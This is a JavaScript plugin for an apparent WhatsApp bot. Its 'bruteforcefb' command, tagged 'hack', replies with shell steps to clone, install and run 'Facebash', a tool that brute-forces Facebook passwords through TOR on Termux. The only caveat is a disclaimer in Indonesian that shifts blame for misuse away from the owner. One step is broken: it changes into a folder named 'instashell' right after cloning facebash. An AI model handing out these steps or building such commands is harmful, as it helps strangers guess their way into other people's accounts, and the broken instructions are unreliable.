let handler  = async (m, { conn, usedPrefix: _p }) => {
  conn.reply(m.chat, `
━━━━━━━━━━━━━━━━━━━━
Facebash – Brute Force Facebook TOR Termux 
━━━━━━━━━━━━━━━━━━━━
git clone https://github.com/thelinuxchoice/facebash

$ cd instashell

$ chmod +x facebash.sh

$ service tor start

$ sudo ./facebash.sh

Install requirements:

$ chmod +x install.sh

$ sudo ./install.sh

*💎 NOTED:*
*Gunakan Script dan bot Dengan Bijak!*
*Jika Anda Menyalah gunakan Script dan bot Owner Tidak Bertanggung Jawab!*
`.trim(), m)
}
handler.help = ['bruteforcefb']
handler.tags = ['hack']
handler.command = /^(bruteforcefb)$/i
handler.owner = false
handler.mods = false
handler.premium = false
handler.group = false
handler.private = false

handler.admin = false
handler.botAdmin = false

handler.fail = null

module.exports = handler
